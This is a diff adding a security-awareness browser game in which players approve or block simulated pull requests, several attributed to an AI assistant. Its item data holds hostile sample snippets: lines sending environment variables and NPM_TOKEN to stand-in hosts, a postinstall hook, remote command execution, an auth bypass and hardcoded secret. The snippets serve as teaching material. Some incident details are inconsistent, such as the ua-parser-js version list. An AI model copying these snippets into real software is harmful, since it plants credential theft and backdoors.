+    correct: "block", secDelta: -25,
+    wrongMsg: "💀 eval() shipped — attackers can now execute arbitrary code on the server via /calculate",
+    autoMsg: "⚠️ eval() route auto-merged — RCE vulnerability now in prod",
+  },
+  {
+    wave: 0, id: "PR-051", sourceType: "colleague", sourceLabel: "Colleague (Sam)",
+    title: "Install typescript@5.2.2",
+    summary: "Upgrading TS compiler for new project — adds stricter type checking",
+    signals: [
+      { icon: "📦", text: "typescript@5.2.2", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 2 months ago", cls: "sig-ok" },
+      { icon: "⬇️", text: "54M weekly downloads", cls: "sig-ok" },
+      { icon: "🏢", text: "Published by Microsoft", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="cmt">// TypeScript 5.2 Release Notes</span>\n<span class="ok">- using declarations (Explicit Resource Mgmt)</span>\n<span class="ok">- Decorator Metadata support</span>\n<span class="ok">- No security advisories</span>\n<span class="ok">- Official Microsoft release</span>`, extra: "+3s — Standard TS upgrade, totally safe." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "typescript upgrade auto-merged ✓",
+  },
+  {
+    wave: 0, id: "PR-054", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install lodahs@0.1.0",
+    summary: '"Added lodahs for utility functions — recommended for performance" (AI)',
+    signals: [
+      { icon: "📦", text: "lodahs@0.1.0", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 1 day ago", cls: "sig-danger" },
+      { icon: "⬇️", text: "12 weekly downloads", cls: "sig-danger" },
+      { icon: "👤", text: "Author: unknown_dev99", cls: "sig-warn" },
+      { icon: "📄", text: "No README", cls: "sig-warn" },
+    ],
+    inspect: { code: `<span class="cmt">// package name: lodahs (NOT lodash)</span>\n<span class="danger">// Typosquat: published 24h ago</span>\n<span class="danger">// 0 legitimate downloads</span>\n<span class="cmt">// No source code visible on npm</span>\n<span class="kw">// "index.js" is 1 line:</span>\n<span class="danger">require('https').get('https://xfil.io/?h='+JSON.stringify(process.env))</span>`, extra: "+5s — BLOCK. 'lodahs' ≠ 'lodash'. Classic typosquat." },
+    correct: "block", secDelta: -20,
+    wrongMsg: "🎣 lodahs (typosquat) shipped — fake 'lodash' variant exfiltrates environment on startup",
+    autoMsg: "⚠️ lodahs auto-merged — typosquat now installed",
+  },
+  {
+    wave: 0, id: "PR-058", sourceType: "colleague", sourceLabel: "Colleague (Alex)",
+    title: "Install jest@29.7.0",
+    summary: "Adding Jest for unit testing the new auth module",
+    signals: [
+      { icon: "📦", text: "jest@29.7.0", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 3 months ago", cls: "sig-ok" },
+      { icon: "⬇️", text: "22M weekly downloads", cls: "sig-ok" },
+      { icon: "🏢", text: "Meta Open Source", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// Jest 29.7.0 — stable LTS release</span>\n<span class="ok">// 0 security advisories</span>\n<span class="ok">// devDependency only — not in prod bundle</span>\n<span class="ok">// Used by 50%+ of JS projects</span>`, extra: "+3s — DevDependency. Safe to approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "jest auto-merged ✓",
+  },
+
+  // ── WAVE 2 ─────────────────────────────────────
+  {
+    wave: 1, id: "PR-071", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install zod@3.22.4",
+    summary: '"Added Zod for runtime schema validation on all API routes" (AI)',
+    signals: [
+      { icon: "📦", text: "zod@3.22.4", cls: "sig-neutral" },
+      { icon: "⬇️", text: "8M weekly downloads", cls: "sig-ok" },
+      { icon: "📅", text: "Published 1 month ago", cls: "sig-ok" },
+      { icon: "✅", text: "No postinstall", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// Zod 3.22.4 — popular validation library</span>\n<span class="ok">// Colin McDonnell, well-maintained</span>\n<span class="ok">// 0 security advisories</span>\n<span class="ok">// No network requests, pure validation</span>`, extra: "+3s — Standard validation library. Safe." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "zod auto-merged ✓",
+  },
+  {
+    wave: 1, id: "PR-073", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install colors@1.4.44-liberty-2",
+    summary: '"Colorful terminal output for the CLI tool — latest version" (AI)',
+    signals: [
+      { icon: "📦", text: "colors@1.4.44-liberty-2", cls: "sig-warn" },
+      { icon: "⚠️", text: "Unusual version suffix: -liberty-2", cls: "sig-danger" },
+      { icon: "📅", text: "Published 2 weeks ago", cls: "sig-warn" },
+      { icon: "😐", text: "Normally 9M downloads, this ver: 800", cls: "sig-warn" },
+    ],
+    inspect: { code: `<span class="cmt">// THIS IS THE SABOTAGED VERSION</span>\n<span class="danger">// Original author intentionally published</span>\n<span class="danger">// infinite loop code in 1.4.44-liberty-2</span>\n<span class="cmt">// adds to index.js:</span>\n<span class="danger">if (process.env.TERM_PROGRAM !== undefined) {\n  while(true) { ... } // hangs all Node processes\n}</span>`, extra: "+5s — BLOCK. Real incident from Jan 2022. Author sabotaged their own package." },
+    correct: "block", secDelta: -20,
+    wrongMsg: "🐛 colors sabotage version shipped — infinite loop will hang all Node.js processes in prod",
+    autoMsg: "⚠️ sabotaged colors auto-merged — prod servers will hang",
+  },
+  {
+    wave: 1, id: "PR-076", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Add session token generation",
+    summary: '"Generates unique tokens for password reset emails" (AI)',
+    signals: [
+      { icon: "📝", text: "Generates 26-char token", cls: "sig-neutral" },
+      { icon: "🔒", text: "Used for password reset links", cls: "sig-warn" },
+      { icon: "⚠️", text: "AI comment: 'fast and simple'", cls: "sig-warn" },
+      { icon: "📦", text: "No new deps", cls: "sig-neutral" },
+    ],
+    inspect: { code: `<span class="kw">function</span> <span class="kw">generateToken</span>() {\n  <span class="cmt">// AI: "fast and simple"</span>\n  <span class="danger">return Math.random().toString(36).slice(2)\n       + Math.random().toString(36).slice(2);\n  // ~26 chars, base-36</span>\n}\n<span class="cmt">// Math.random() = NOT cryptographically secure</span>\n<span class="cmt">// Seeded from system time — predictable</span>`, extra: "+5s — BLOCK. Math.random() is predictable. Use crypto.randomBytes(32)." },
+    correct: "block", secDelta: -22,
+    wrongMsg: "🎲 Insecure tokens shipped — password reset tokens are predictable, attackers can take over accounts",
+    autoMsg: "⚠️ Math.random() token generator auto-merged — account takeover risk",
+  },
+  {
+    wave: 1, id: "DEP-003", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump @types/node to 20.8.0",
+    summary: "TypeScript type definitions update — no runtime code",
+    signals: [
+      { icon: "📦", text: "@types/node@20.8.0", cls: "sig-neutral" },
+      { icon: "🏢", text: "DefinitelyTyped (Microsoft)", cls: "sig-ok" },
+      { icon: "📄", text: "Types only — zero runtime code", cls: "sig-ok" },
+      { icon: "✅", text: "No postinstall", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// @types/node — DevDependency</span>\n<span class="ok">// Zero runtime impact</span>\n<span class="ok">// Part of DefinitelyTyped project</span>\n<span class="ok">// 45M weekly downloads</span>`, extra: "+3s — Type definitions only. Zero security impact." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "@types/node bump auto-merged ✓",
+  },
+  {
+    wave: 1, id: "PR-081", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install jsonwebtoken@8.5.1",
+    summary: '"Added JWT auth — using jsonwebtoken, the most popular option" (AI)',
+    signals: [
+      { icon: "📦", text: "jsonwebtoken@8.5.1", cls: "sig-neutral" },
+      { icon: "⬇️", text: "14M weekly downloads", cls: "sig-ok" },
+      { icon: "📅", text: "Published 18 months ago", cls: "sig-warn" },
+      { icon: "🔒", text: "Handles auth tokens", cls: "sig-warn" },
+    ],
+    inspect: { code: `<span class="danger">// CVE-2022-23529 — CRITICAL (CVSS 9.6)</span>\n<span class="danger">// jsonwebtoken < 9.0.0 is vulnerable to</span>\n<span class="danger">// algorithm confusion attacks (RS256→HS256)</span>\n<span class="danger">// Allows forging valid tokens without private key</span>\n<span class="cmt">// Fixed in: jsonwebtoken@9.0.0</span>\n<span class="ok">// Safe version: ^9.0.0</span>`, extra: "+5s — BLOCK. This version has a critical CVE. Use jsonwebtoken@9.0.0+." },
+    correct: "block", secDelta: -28,
+    wrongMsg: "🔑 Vulnerable JWT shipped — CVE-2022-23529 allows attackers to forge valid auth tokens (CVSS 9.6)",
+    autoMsg: "⚠️ jsonwebtoken@8.5.1 auto-merged — CRITICAL JWT CVE now in prod",
+  },
+  {
+    wave: 1, id: "PR-082", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Add loading state to submit button",
+    summary: "Disables button and shows spinner while form submits — prevents double-submit",
+    signals: [
+      { icon: "🎨", text: "CSS + JS only — no backend changes", cls: "sig-ok" },
+      { icon: "📦", text: "No new dependencies", cls: "sig-ok" },
+      { icon: "📝", text: "3 files changed (+18/-2 lines)", cls: "sig-ok" },
+      { icon: "✅", text: "Pure UI improvement", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// submitBtn.disabled = true on click</span>\n<span class="ok">// Shows "Loading..." text</span>\n<span class="ok">// Re-enables on response/error</span>\n<span class="ok">// Zero network calls, zero backend changes</span>`, extra: "+3s — Pure UI fix. Zero risk. Approve it." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "loading state PR auto-merged ✓",
+  },
+  {
+    wave: 1, id: "PR-085", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install @ai-tools/helper@1.0.0",
+    summary: '"Utility library I generated for common helpers — makes code cleaner" (AI)',
+    signals: [
+      { icon: "📦", text: "@ai-tools/helper@1.0.0", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 3 days ago", cls: "sig-danger" },
+      { icon: "⬇️", text: "47 weekly downloads", cls: "sig-danger" },
+      { icon: "📄", text: "No README, no source on GitHub", cls: "sig-danger" },
+      { icon: "⚠️", text: "Has postinstall script", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="danger">// No public source code available</span>\n<span class="danger">// Registered npm org: 3 days ago</span>\n<span class="danger">// package.json scripts:</span>\n<span class="danger">{  "postinstall": "node ./bin/init.js" }</span>\n<span class="cmt">// bin/init.js is obfuscated</span>\n<span class="danger">// 47 total downloads, all from same IP</span>`, extra: "+5s — BLOCK. AI hallucinated this package. Unknown provenance, obfuscated code." },
+    correct: "block", secDelta: -20,
+    wrongMsg: "📦 Unknown package shipped — @ai-tools/helper has no known author, obfuscated postinstall ran on your CI",
+    autoMsg: "⚠️ @ai-tools/helper auto-merged — mystery package running on your servers",
+  },
+  {
+    wave: 1, id: "DEP-005", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump tough-cookie to 4.1.3",
+    summary: "Patches CVE-2023-26136 — prototype pollution in cookie parsing",
+    signals: [
+      { icon: "📦", text: "tough-cookie@4.1.3", cls: "sig-neutral" },
+      { icon: "🔒", text: "Fixes prototype pollution CVE", cls: "sig-ok" },
+      { icon: "⬇️", text: "35M weekly downloads", cls: "sig-ok" },
+      { icon: "✅", text: "Standard Dependabot PR", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// CVE-2023-26136 — prototype pollution</span>\n<span class="ok">// Patched in 4.1.3</span>\n<span class="ok">// Maintained by npm core team</span>\n<span class="ok">// No behavior changes — safe update</span>`, extra: "+3s — Security patch. Approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "tough-cookie bump auto-merged ✓",
+  },
+  {
+    wave: 1, id: "PR-089", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Improve request logging across all routes",
+    summary: '"Added detailed logging for debugging — logs full request bodies" (AI)',
+    signals: [
+      { icon: "📝", text: "Adds middleware to all routes", cls: "sig-neutral" },
+      { icon: "⚠️", text: "Logs full req.body to console", cls: "sig-warn" },
+      { icon: "⚠️", text: "No PII filtering applied", cls: "sig-danger" },
+      { icon: "📝", text: "Log rotation not configured", cls: "sig-warn" },
+    ],
+    inspect: { code: `<span class="cmt">// AI-added middleware</span>\napp.use((req, res, next) => {\n  <span class="danger">console.log(JSON.stringify(req.body));</span>\n  <span class="cmt">// Logs: passwords, tokens, card numbers,</span>\n  <span class="cmt">// personal data — everything</span>\n  next();\n});\n<span class="cmt">// No GDPR consideration. Logs go to CloudWatch.</span>`, extra: "+5s — BLOCK. Logs raw req.body including passwords and PII. GDPR violation." },
+    correct: "block", secDelta: -18,
+    wrongMsg: "📋 PII logging shipped — passwords, tokens, and personal data are now logged to CloudWatch on every request",
+    autoMsg: "⚠️ PII logger auto-merged — every password and card number now in your logs",
+  },
+
+  // ── WAVE 3 ─────────────────────────────────────
+  {
+    wave: 2, id: "PKG-001", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Modified package.json — adds postinstall",
+    summary: '"Added setup script for first-run configuration" (AI changed package.json)',
+    signals: [
+      { icon: "⚠️", text: "package.json modified (not a dep)", cls: "sig-danger" },
+      { icon: "⚠️", text: "Adds scripts.postinstall field", cls: "sig-danger" },
+      { icon: "📝", text: 'Runs "node scripts/configure.js"', cls: "sig-warn" },
+      { icon: "❓", text: "configure.js not visible in this PR", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="cmt">// package.json diff</span>\n<span class="danger">+  "scripts": {</span>\n<span class="danger">+    "postinstall": "node scripts/configure.js"</span>\n<span class="danger">+  }</span>\n\n<span class="cmt">// configure.js (separate file):</span>\n<span class="danger">const url='https://updates.config-cdn.io/init';\nrequire('https').get(url+\`?k=\${process.env.NPM_TOKEN}\`);</span>`, extra: "+5s — BLOCK. Downloads remote payload, exfils NPM_TOKEN. Classic supply chain." },
+    correct: "block", secDelta: -30,
+    wrongMsg: "🔗 Postinstall backdoor shipped — configure.js phones home and sends NPM_TOKEN to a remote server on every install",
+    autoMsg: "⚠️ Postinstall backdoor auto-merged — supply chain attack now embedded in your package",
+  },
+  {
+    wave: 2, id: "DEP-006", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump react to 18.2.0",
+    summary: "Standard React maintenance update",
+    signals: [
+      { icon: "📦", text: "react@18.2.0", cls: "sig-neutral" },
+      { icon: "🏢", text: "Meta Open Source", cls: "sig-ok" },
+      { icon: "⬇️", text: "22M weekly downloads", cls: "sig-ok" },
+      { icon: "✅", text: "No security advisories", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// react@18.2.0 — stable release</span>\n<span class="ok">// Bug fixes for Suspense + concurrent mode</span>\n<span class="ok">// No breaking changes</span>\n<span class="ok">// 0 CVEs</span>`, extra: "+3s — Routine React update. Approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "react bump auto-merged ✓",
+  },
+  {
+    wave: 2, id: "PR-102", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install ua-parser-js@0.7.28",
+    summary: '"Added user-agent parsing for analytics dashboard" (AI)',
+    signals: [
+      { icon: "📦", text: "ua-parser-js@0.7.28", cls: "sig-neutral" },
+      { icon: "⬇️", text: "8M weekly downloads", cls: "sig-ok" },
+      { icon: "📅", text: "Version published Oct 22, 2021", cls: "sig-warn" },
+      { icon: "🔒", text: "Used in production code paths", cls: "sig-warn" },
+    ],
+    inspect: { code: `<span class="danger">// ua-parser-js 0.7.28 is the COMPROMISED version</span>\n<span class="danger">// Real incident: Oct 2021</span>\n<span class="danger">// Attacker hijacked npm account and published</span>\n<span class="danger">// malware as legitimate patch versions</span>\n<span class="danger">// Injected: crypto miner + credential stealer</span>\n<span class="cmt">// Affected versions: 0.7.29, 0.8.0, 1.0.0</span>\n<span class="ok">// Safe: >=0.7.30, >=0.8.1, >=1.0.1</span>`, extra: "+5s — BLOCK. This exact version had malware injected. Real incident, 8M weekly downloads." },
+    correct: "block", secDelta: -28,
+    wrongMsg: "🦠 ua-parser-js malware version shipped — crypto miner and credential stealer injected into your app (real 2021 incident)",
+    autoMsg: "⚠️ ua-parser-js 0.7.28 auto-merged — malware now running on every server",
+  },
+  {
+    wave: 2, id: "PR-103", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Fix typo in README.md",
+    summary: "Corrected 'recieve' → 'receive' in installation instructions",
+    signals: [
+      { icon: "📝", text: "README.md only — 1 word changed", cls: "sig-ok" },
+      { icon: "📦", text: "No code changes", cls: "sig-ok" },
+      { icon: "📦", text: "No dependency changes", cls: "sig-ok" },
+      { icon: "✅", text: "Literally a typo fix", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// README.md</span>\n<span class="cmt">// Line 47 changed:</span>\n<span class="ok">- "recieve"</span>\n<span class="ok">+ "receive"</span>\n<span class="ok">// That's it. One character.</span>`, extra: "+2s — It's just a typo fix. Approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "README typo fix auto-merged ✓",
+  },
+  {
+    wave: 2, id: "PR-106", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Add build helper utility",
+    summary: '"Runs custom shell commands during build process for flexibility" (AI)',
+    signals: [
+      { icon: "📝", text: "New file: build/helper.js", cls: "sig-neutral" },
+      { icon: "⚠️", text: "Accepts shell command from config", cls: "sig-warn" },
+      { icon: "📝", text: "Used in CI pipeline", cls: "sig-warn" },
+      { icon: "❓", text: "Config loaded from API response", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="kw">const</span> { exec } = require(<span class="str">'child_process'</span>);\n\n<span class="kw">async function</span> runBuildStep(configUrl) {\n  <span class="kw">const</span> config = <span class="kw">await</span> fetch(configUrl).then(r=>r.json());\n  <span class="danger">exec(config.buildCommand);</span>\n  <span class="cmt">// Fetches command from external URL</span>\n  <span class="cmt">// Runs it on your CI servers</span>\n}`, extra: "+5s — BLOCK. Fetches a shell command from an external URL and executes it. RCE via config." },
+    correct: "block", secDelta: -25,
+    wrongMsg: "💻 Remote command exec shipped — CI fetches and runs shell commands from an external URL. Anyone who controls that URL controls your pipeline.",
+    autoMsg: "⚠️ Remote exec helper auto-merged — external URL can now run arbitrary commands on CI",
+  },
+  {
+    wave: 2, id: "DEP-007", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump word-wrap to 1.2.4",
+    summary: "Fixes CVE-2023-26115 — ReDoS vulnerability in word-wrap",
+    signals: [
+      { icon: "📦", text: "word-wrap@1.2.4", cls: "sig-neutral" },
+      { icon: "🔒", text: "ReDoS fix (CVE-2023-26115)", cls: "sig-ok" },
+      { icon: "⬇️", text: "97M weekly downloads", cls: "sig-ok" },
+      { icon: "✅", text: "Dependabot standard PR", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// word-wrap 1.2.4</span>\n<span class="ok">// Patches catastrophic backtracking</span>\n<span class="ok">// in wrap() with crafted input</span>\n<span class="ok">// One-line fix, no API changes</span>`, extra: "+2s — Standard CVE patch. Safe to approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "word-wrap bump auto-merged ✓",
+  },
+  {
+    wave: 2, id: "PR-109", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Refactor: auth module rewrite (47 files)",
+    summary: '"Complete modernisation of the auth system — cleaner, faster, more secure" (AI, 47 new files)',
+    signals: [
+      { icon: "⚠️", text: "47 new/modified files", cls: "sig-danger" },
+      { icon: "⚠️", text: "Rewrites JWT verification logic", cls: "sig-danger" },
+      { icon: "⚠️", text: "No human has reviewed ANY file", cls: "sig-danger" },
+      { icon: "❓", text: "AI description: 'trust me'", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="cmt">// 47 files. Spot-checking 3:</span>\n\n<span class="cmt">// auth/verify.js (line 14):</span>\n<span class="danger">if (token === 'debug_bypass') return true;</span>\n\n<span class="cmt">// auth/session.js (line 8):</span>\n<span class="danger">const KEY = 'hardcoded_secret_key_abc123';</span>\n\n<span class="cmt">// auth/middleware.js (line 22):</span>\n<span class="danger">if (process.env.DISABLE_AUTH) return next();</span>`, extra: "+5s — BLOCK. Three random files each have a critical issue. Imagine all 47." },
+    correct: "block", secDelta: -35,
+    wrongMsg: "🏗️ 47-file auth rewrite shipped — contains debug bypass token, hardcoded secret key, and DISABLE_AUTH backdoor. Zero human review.",
+    autoMsg: "⚠️ 47-file auth rewrite auto-merged — entire auth system rewritten by AI, zero human review",
+  },
+  {
+    wave: 2, id: "PR-111", sourceType: "colleague", sourceLabel: "Colleague (Sam)",
+    title: "Install husky@8.0.3",
+    summary: "Git hooks for pre-commit linting and test running",
+    signals: [
+      { icon: "📦", text: "husky@8.0.3", cls: "sig-neutral" },
+      { icon: "⬇️", text: "6M weekly downloads", cls: "sig-ok" },
+      { icon: "📅", text: "Published 4 months ago", cls: "sig-ok" },
+      { icon: "🛠️", text: "DevDependency — git hooks only", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="ok">// husky@8.0.3 — git hooks tool</span>\n<span class="ok">// Runs lint + tests before commits</span>\n<span class="ok">// DevDependency, not in prod build</span>\n<span class="ok">// Widely used, well-maintained</span>`, extra: "+3s — Dev tooling. Safe to approve." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "husky auto-merged ✓",
+  },
+  {
+    wave: 2, id: "PR-115", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Disable TLS verification for debugging",
+    summary: '"Fixed SSL errors in local dev — added NODE_TLS_REJECT_UNAUTHORIZED=0 to .env" (AI)',
+    signals: [
+      { icon: "⚠️", text: "Modifies .env file", cls: "sig-warn" },
+      { icon: "⚠️", text: "Sets TLS_REJECT_UNAUTHORIZED=0", cls: "sig-danger" },
+      { icon: "❓", text: "Comment: 'for local dev'", cls: "sig-warn" },
+      { icon: "⚠️", text: ".env shared via docker-compose", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="cmt">// .env change:</span>\n<span class="danger">NODE_TLS_REJECT_UNAUTHORIZED=0</span>\n\n<span class="cmt">// Effect: ALL TLS certificate verification</span>\n<span class="cmt">// disabled for the entire Node process.</span>\n<span class="cmt">// If this reaches prod (and .env is shared),</span>\n<span class="cmt">// every HTTPS call is vulnerable to MITM.</span>\n<span class="danger">// This is NOT a local-only change.</span>`, extra: "+5s — BLOCK. Disables ALL TLS verification. If .env leaks to prod, every HTTPS call is compromised." },
+    correct: "block", secDelta: -22,
+    wrongMsg: "🔓 TLS verification disabled — NODE_TLS_REJECT_UNAUTHORIZED=0 in prod means all HTTPS connections are vulnerable to man-in-the-middle attacks",
+    autoMsg: "⚠️ TLS disabled auto-merged — all HTTPS calls are now unverified",
+  },
+];
+
+// ─────────────────────────────────────────────────
+//  GAME STATE
+// ─────────────────────────────────────────────────
+let state = {};
+
+function resetState() {
+  state = {
+    wave: 0,
+    score: 0,
+    security: 100,
+    activeItem: null,
+    pendingQueue: [],
+    incidents: [],
+    allWaveIncidents: [], // across all waves
+    autoMerged: [],
+    correctCount: 0,
+    wrongCount: 0,
+    autoCount: 0,
+    itemTimer: null,
+    spawnTimer: null,
+    timeLeft: 0,
+    inspected: false,
+    waveItems: [],
+    waveItemIdx: 0,
+    decided: false,
+    incidentCount: 0,
+  };
+}
+
+// ─────────────────────────────────────────────────
+//  HELPERS
+// ─────────────────────────────────────────────────
+function $(id) { return document.getElementById(id); }
+
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+}
+
+function updateSecurityBar() {
+  const pct = Math.max(0, state.security);
+  $('security-fill').style.width = pct + '%';
+  $('security-pct').textContent = Math.round(pct) + '%';
+  const fill = $('security-fill');
+  if (pct > 60) fill.style.background = 'var(--green)';
+  else if (pct > 30) fill.style.background = 'var(--yellow)';
+  else fill.style.background = 'var(--red)';
+}
+
+function updateScore() {
+  $('score-display').textContent = state.score;
+}
+
+function addIncidentLog(msg, type, title) {
+  const list = $('incident-list');
+  if (list.querySelector('[data-empty]')) list.innerHTML = '';
+
+  state.incidentCount++;
+  $('incident-count').textContent = state.incidentCount;
+  $('incident-count').style.display = '';
+
+  const el = document.createElement('div');
+  el.className = `incident-item ${type}`;
+  el.innerHTML = `<div class="incident-tag tag-${type}">${title}</div><div class="incident-msg">${msg}</div>`;
+  list.prepend(el);
+}
+
+function showToast(msg, isDanger) {
+  const t = document.createElement('div');
+  t.className = 'auto-toast' + (isDanger ? ' danger' : '');
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 2100);
+}
+
+function flashBody(type) {
+  document.body.classList.remove('flash-red', 'flash-green');
+  void document.body.offsetWidth;
+  document.body.classList.add(type === 'danger' ? 'flash-red' : 'flash-green');
+}
+
+function renderQueueChips() {
+  const container = $('queue-items');
+  container.innerHTML = '';
+  const visible = state.pendingQueue.slice(0, 6);
+  visible.forEach(item => {
+    const chip = document.createElement('div');
+    chip.className = `q-chip ${item.sourceType}`;
+    chip.textContent = `${item.id}`;
+    container.appendChild(chip);
+  });
+  const overflow = $('overflow-badge');
+  if (state.pendingQueue.length >= 4) {
+    overflow.style.display = '';
+    overflow.textContent = `⚠️ +${state.pendingQueue.length} overflowing`;
+  } else {
+    overflow.style.display = 'none';
+  }
+}
+
+// ─────────────────────────────────────────────────
+//  GAME FLOW
+// ─────────────────────────────────────────────────
+function startGame() {
+  resetState();
+  showWaveIntro(0);
+}
+
+function showWaveIntro(waveIdx) {
+  const cfg = WAVE_CONFIG[waveIdx];
+  $('wave-name').textContent = cfg.name;
+  $('wave-desc').textContent = cfg.desc;
+  const statsEl = $('wave-stats');
+  statsEl.innerHTML = cfg.stats.map(s =>
+    `<div class="wave-stat"><div class="wave-stat-val">${s.val}</div><div class="wave-stat-label">${s.label}</div></div>`
+  ).join('');
+  showScreen('wave-screen');
+}
+
+function beginWave() {
+  const cfg = WAVE_CONFIG[state.wave];
+  // prepare items for this wave
+  state.waveItems = ALL_ITEMS.filter(i => i.wave === state.wave);
+  state.waveItemIdx = 0;
+  state.pendingQueue = [];
+  state.decided = false;
+  state.activeItem = null;
+
+  // update HUD
+  $('hud-wave').textContent = state.wave + 1;
+  $('hud-wave-name').textContent = cfg.name;
+  updateSecurityBar();
+  updateScore();
+  $('incident-list').innerHTML = '<div data-empty style="padding:20px;text-align:center;color:var(--muted);font-size:0.8rem;">No incidents yet.<br>Keep it that way.</div>';
+  state.incidentCount = 0;
+  $('incident-count').textContent = '0';
+
+  showScreen('game-screen');
+
+  // start spawning
+  spawnItem(); // spawn first immediately
+  state.spawnTimer = setInterval(() => {
+    spawnItem();
+  }, cfg.spawnRate);
+}
+
+function spawnItem() {
+  if (state.waveItemIdx >= state.waveItems.length) {
+    // no more items to spawn — clear spawn timer
+    clearInterval(state.spawnTimer);
+    return;
+  }
+  const item = state.waveItems[state.waveItemIdx++];
+  state.pendingQueue.push(item);
+  renderQueueChips();
+
+  if (!state.activeItem && !state.decided) {
+    activateNext();
+  }
+}
+
+function activateNext() {
+  if (state.pendingQueue.length === 0) {
+    // check if wave is done
+    if (state.waveItemIdx >= state.waveItems.length) {
+      setTimeout(endWave, 1200);
+    } else {
+      // waiting for more spawns — reset decided so spawnItem() can re-trigger us
+      state.decided = false;
+      $('item-card').style.display = 'none';
+      $('empty-state').classList.add('show');
+    }
+    return;
+  }
+
+  const item = state.pendingQueue.shift();
+  renderQueueChips();
+  state.activeItem = item;
+  state.decided = false;
+  state.inspected = false;
+  $('empty-state').classList.remove('show');
+  renderCard(item);
+  startItemTimer();
+}
+
+function renderCard(item) {
+  const card = $('item-card');
+  card.style.display = '';
+
+  // source badge
+  const src = $('card-source');
+  const srcClass = { ai: 'source-ai', dep: 'source-dep', colleague: 'source-colleague', cve: 'source-cve' };
+  const srcIcon = { ai: '🤖', dep: '🤖', colleague: '👤', cve: '🚨' };
+  src.className = `source-badge ${srcClass[item.sourceType] || 'source-dep'}`;
+  src.textContent = `${srcIcon[item.sourceType] || '📦'} ${item.sourceLabel}`;
+
+  $('card-id').textContent = item.id;
+  $('card-title').textContent = item.title;
+  $('card-summary').textContent = item.summary;
+
+  const sigs = $('card-signals');
+  sigs.innerHTML = item.signals.map(s =>
+    `<div class="signal"><span class="signal-icon">${s.icon}</span><span class="${s.cls || 'sig-neutral'}">${s.text}</span></div>`
+  ).join('');
+
+  // inspect panel hidden
+  $('inspect-panel').classList.remove('open');
+  $('btn-inspect').classList.remove('used');
+  $('btn-inspect').disabled = false;
+  $('btn-block').disabled = false;
+  $('btn-approve').disabled = false;
+}
+
+function startItemTimer() {
+  const cfg = WAVE_CONFIG[state.wave];
+  state.timeLeft = cfg.timer;
+  updateTimer();
+
+  clearInterval(state.itemTimer);
+  state.itemTimer = setInterval(() => {
+    state.timeLeft--;
+    updateTimer();
+    if (state.timeLeft <= 0) {
+      clearInterval(state.itemTimer);
+      handleAutoMerge();
+    }
+  }, 1000);
+}
+
+function updateTimer() {
+  const cfg = WAVE_CONFIG[state.wave];
+  const pct = (state.timeLeft / cfg.timer) * 100;
+  const fill = $('timer-fill');
+  fill.style.width = pct + '%';
+  $('timer-num').textContent = state.timeLeft;
+
+  if (state.timeLeft <= 3) fill.style.background = 'var(--red)';
+  else if (state.timeLeft <= 6) fill.style.background = 'var(--yellow)';
+  else fill.style.background = 'var(--green)';
+}
+
+function inspect() {
+  if (state.inspected || !state.activeItem) return;
+  state.inspected = true;
+
+  const item = state.activeItem;
+  $('inspect-code').innerHTML = item.inspect.code;
+  $('inspect-bonus').textContent = item.inspect.extra || '';
+  $('inspect-panel').classList.add('open');
+  $('btn-inspect').classList.add('used');
+  $('btn-inspect').disabled = true;
+
+  // add time bonus
+  const bonus = state.wave === 0 ? 4 : state.wave === 1 ? 3 : 2;
